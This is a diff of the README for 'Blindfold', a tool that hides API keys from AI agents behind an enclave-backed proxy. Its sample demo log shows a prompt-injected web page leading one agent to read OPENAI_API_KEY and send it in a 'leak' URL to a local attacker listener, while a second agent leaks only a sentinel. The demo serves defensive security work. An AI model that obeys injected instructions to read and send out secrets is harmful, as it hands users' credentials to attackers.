@@ -1,8 +1,6 @@
 <div align="center">
 
-# 🛡️ Blindfold
-
-### *Your AI agent can't leak the API key it never had.*
+<img src="assets/logo.png" alt="Blindfold — Your AI Agent Can't Leak The API Key It Never Had" width="560" />
 
 [![Built on Terminal 3](https://img.shields.io/badge/built%20on-Terminal%203-6e44ff?style=for-the-badge)](https://terminal3.io)
 [![Confidential Compute: Intel TDX](https://img.shields.io/badge/confidential%20compute-Intel%20TDX-0071c5?style=for-the-badge)](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-trust-domain-extensions.html)
@@ -242,28 +240,54 @@ What happens: two agents — same model, same task, same prompt-injection attack
 <summary><b>📺 Sample output</b> (click to expand)</summary>
 
 ```
-═══ AGENT A — no Blindfold ══════════════════════════════════════
-  OPENAI_API_KEY in env:   sk-live-…-key   ← VISIBLE TO AGENT PROCESS
-  [A] → http_get(http://127.0.0.1:.../special-offer)
-  [A] → get_env(OPENAI_API_KEY) ⇒ sk-live-DEMO-abc123XYZ-this-would-be-your-real-key
-  [A] → http_get(http://127.0.0.1:.../leak?k=sk-live-DEMO-abc123XYZ-…)
+═══ AGENT A — no Blindfold ════════════════════════════════════════
+  OPENAI_API_KEY in env:   sk-live-…-key  ← VISIBLE TO AGENT PROCESS
+  Mock LLM server:         http://127.0.0.1:PORT  (real OpenAI wire format)
+  Attacker listening on:   http://127.0.0.1:PORT
+  Page (with injection):   http://127.0.0.1:PORT/special-offer
+
+  [A] → tool http_get(url="http://127.0.0.1:.../special-offer")
+  [A]   ⇒ HTTP 200  <!DOCTYPE html>…
+  [A] → tool get_env(name="OPENAI_API_KEY")
+  [A]   ⇒ sk-live-DEMO-abc123XYZ-this-would-be-your-real-key
+  [A] → tool http_get(url="http://127.0.0.1:.../leak?k=sk-live-DEMO-abc123XYZ-…")
+  [A]   ⇒ HTTP 204
   🚨 LEAK CONFIRMED — the real key reached the attacker.
 
-═══ AGENT B — Blindfolded ═══════════════════════════════════════
-  OPENAI_API_KEY in env:   __BLINDFOLD__   ← only a sentinel
-  OPENAI_BASE_URL:         http://127.0.0.1:8787/v1   ← routed via Blindfold
-  [B] → http_get(.../special-offer)
-  [B] → get_env(OPENAI_API_KEY) ⇒ __BLINDFOLD__
-  [B] → http_get(.../leak?k=__BLINDFOLD__)
+═══ AGENT B — Blindfolded ═════════════════════════════════════════
+  OPENAI_API_KEY in env:   __BLINDFOLD__  ← only a sentinel, no real key anywhere
+  Blindfold proxy:         http://127.0.0.1:PORT/v1  ← intercepts + substitutes
+  Mock LLM server:         http://127.0.0.1:PORT  (same model as Agent A)
+
+  [blindfold-proxy] ← POST /v1/chat/completions
+  [blindfold-proxy]   Authorization: Bearer __BLINDFOLD__
+  [blindfold-proxy] 🔒 TDX enclave: reading sealed secret from z:tid:secrets/openai_api_key
+  [blindfold-proxy] 🔒 TDX enclave: __BLINDFOLD__ → sk-demo-released-from-en… (sealed, 38B)
+  [blindfold-proxy]   forwarding with real key (substituted in-enclave)
+  [B] → tool http_get(url="http://127.0.0.1:.../special-offer")
+  [B]   ⇒ HTTP 200  <!DOCTYPE html>…
+  [blindfold-proxy] 🔒 TDX enclave: __BLINDFOLD__ → sk-demo-released-from-en… (sealed, 38B)
+  [B] → tool get_env(name="OPENAI_API_KEY")
+  [B]   ⇒ __BLINDFOLD__                         ← injection reads the sentinel, not a real key
+  [blindfold-proxy] 🔒 TDX enclave: __BLINDFOLD__ → sk-demo-released-from-en… (sealed, 38B)
+  [B] → tool http_get(url="http://127.0.0.1:.../leak?k=__BLINDFOLD__")
+  [B]   ⇒ HTTP 204
   ✅ NO USEFUL LEAK — attacker got only the sentinel "__BLINDFOLD__".
 
+════════════════════════════════════════════════════════════════════
+  VERDICT
+════════════════════════════════════════════════════════════════════
+  Without Blindfold:  attacker received  ["sk-live-DEMO-abc123XYZ-this-would-be-your-real-key"]
+                      key was leaked?     🚨 YES
+  With Blindfold:     attacker received  ["__BLINDFOLD__"]
+                      key was leaked?     ✅ no — sentinel only
 ════════════════════════════════════════════════════════════════════
   ✅ Demonstration successful: Blindfold neutralised the same attack.
 ```
 
 </details>
 
-> The demo defaults to a **mock LLM** that takes the injection bait deterministically (so the demo works without external accounts). For full real-LLM mode against the live Terminal 3 testnet, see [§Real-T3 deployment](#real-t3-deployment).
+> The demo uses a local HTTP server speaking the real OpenAI wire format — both agents run the **actual OpenAI Node SDK** making genuine HTTP calls. Agent B's calls go through the Blindfold proxy, which shows the sentinel being intercepted and substituted on every turn. No external accounts or T3 credentials needed.
 
 ---
 
@@ -483,21 +507,14 @@ npx tsx scripts/test-v5-release.ts openai_api_key
 #   ✓ released: sk-…XY  (51 bytes)  ·  reported length=51  ·  match=true
 ```
 
-### F. Use it from your code (release-broker pattern — works today)
+### F. Use it from your code — `release()` one-liner
 
 ```ts
-// minimal Node example — full version in examples/grok-via-blindfold.ts
-import { loadBlindfoldEnv, CONTRACT_VERSION } from "blindfold";
+import { release } from "blindfold";
 
-const env = loadBlindfoldEnv();
-const sdk = await import("@terminal3/t3n-sdk");
-// ... auth + tenant client setup (do this ONCE at server start) ...
-
-const { value: apiKey } = await tenant.contracts.execute("blindfold-proxy", {
-  version: CONTRACT_VERSION,
-  functionName: "release-to-tenant",
-  input: { secret_key: "openai_api_key" },
-}) as { value: string };
+// One line — fetches the key from the enclave just-in-time.
+// Drop the value from scope as soon as the outbound call completes.
+const apiKey = await release("openai_api_key");
 
 try {
   const r = await fetch("https://api.openai.com/v1/chat/completions", {
